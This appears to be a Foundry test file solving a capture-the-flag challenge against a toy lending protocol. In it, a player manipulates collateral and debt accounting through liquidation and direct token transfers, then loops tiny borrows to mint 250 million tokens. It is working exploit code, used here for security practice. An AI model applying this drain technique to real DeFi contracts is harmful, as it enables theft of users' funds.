// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Token} from "../../src/xyz/Token.sol";
import {Manager} from "../../src/xyz/Manager.sol";
import {Challenge} from "../../src/xyz/Challenge.sol";
import {PriceFeed} from "../../src/xyz/PriceFeed.sol";
import {ERC20Signal} from "../../src/xyz/ERC20Signal.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract ExploitTest is Test {
    Token public sETH;
    Token public XYZ;
    Manager public manager;
    Challenge public challenge;
    ERC20Signal public collatoralToken;
    ERC20Signal public debtToken;
    PriceFeed public priceFeed;
    address public system = address(0x123);
    address public player = address(0x456);

    // address public player2 = address(0x4567);

    function setUp() public {
        vm.startPrank(system);
        sETH = new Token(system, "sETH");
        manager = new Manager();
        XYZ = manager.xyz();
        challenge = new Challenge(XYZ, sETH, manager);

        manager.addCollateralToken(
            IERC20(address(sETH)),
            new PriceFeed(),
            20_000_000_000_000_000 ether,
            1 ether
        );

        sETH.mint(system, 2 ether);
        sETH.approve(address(manager), type(uint256).max);
        manager.manage(sETH, 2 ether, true, 3395 ether, true);

        (collatoralToken, debtToken, priceFeed, , ) = manager.collateralData(
            IERC20(address(sETH))
        );

        sETH.mint(player, 6000 ether);
        vm.stopPrank();
    }

    function _computeHealth(
        uint256 collateral,
        uint256 debt,
        uint256 price
    ) internal pure returns (uint256) {
        return debt > 0 ? (collateral * price) / debt : type(uint256).max;
    }

    function systemAddressHealth() public view returns (uint256) {
        uint256 wholeCollateral = collatoralToken.balanceOf(system);
        uint256 wholeDebt = debtToken.balanceOf(system);
        (uint256 price, ) = priceFeed.fetchPrice();
        return _computeHealth(wholeCollateral, wholeDebt, price);
    }

    function printStatus() public view {
        console.log("Player sETH balance", sETH.balanceOf(player));
        console.log("Player XYZ balance", XYZ.balanceOf(player));
        console.log("collateral token signal", collatoralToken.signal());
        console.log("debt token signal", debtToken.signal());
        console.log(
            "manager actual sETH balance",
            sETH.balanceOf(address(manager))
        );
        console.log("systemAddressHealth", systemAddressHealth());
        console.log("-------------------");
    }

    function test_Exploit() public {
        vm.startPrank(player);
        sETH.approve(address(manager), type(uint256).max);
        printStatus();

        manager.manage(sETH, 212e16 + 1, true, 3600e18, true);
        sETH.transfer(address(manager), sETH.balanceOf(player));
        manager.liquidate(system);
        printStatus();

        ExploitHelper exploitHelper = new ExploitHelper(sETH, XYZ, manager);
        sETH.transfer(address(exploitHelper), sETH.balanceOf(player));
        exploitHelper.execute();
        console.log(
            "XYZ balance of target:",
            XYZ.balanceOf(address(0xCAFEBABE))
        );
        vm.stopPrank();
    }
}

contract ExploitHelper {
    Token public sETH;
    Token public XYZ;
    Manager public manager;

    constructor(Token _sETH, Token _XYZ, Manager _manager) {
        sETH = _sETH;
        XYZ = _XYZ;
        manager = _manager;
    }

    function execute() public {
        sETH.approve(address(manager), type(uint256).max);
        while (XYZ.balanceOf(address(this)) < 250_000_000 ether) {
            manager.manage(sETH, 1, true, 93e21, true);
        }
        XYZ.transfer(address(0xCAFEBABE), 250_000_000 ether);
    }
}
